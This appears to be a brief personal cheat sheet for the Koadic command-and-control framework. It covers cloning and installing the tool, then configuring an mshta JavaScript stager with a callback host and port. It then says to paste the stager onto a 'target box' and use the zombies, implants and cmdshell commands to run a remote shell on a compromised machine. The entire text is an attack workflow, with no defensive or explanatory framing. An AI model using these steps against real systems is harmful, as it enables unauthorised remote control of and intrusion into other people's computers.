cd /usr/share
git clone https://github.com/zerosum0x0/koadic.git
pip install -r /usr/share/koadic/requirements.txt
-------------------------

requires a reverse shell

use starget/js/mshta
set lport <port to call back to>
set lhost <host to call back to>
set endpoint 
info
make sure tunnels are set up and call back is going in tunnel
run
copy text to target box

zombies <0>   #shows basic info of new target
use implants <tabcomplete>
cmdshell <session id>
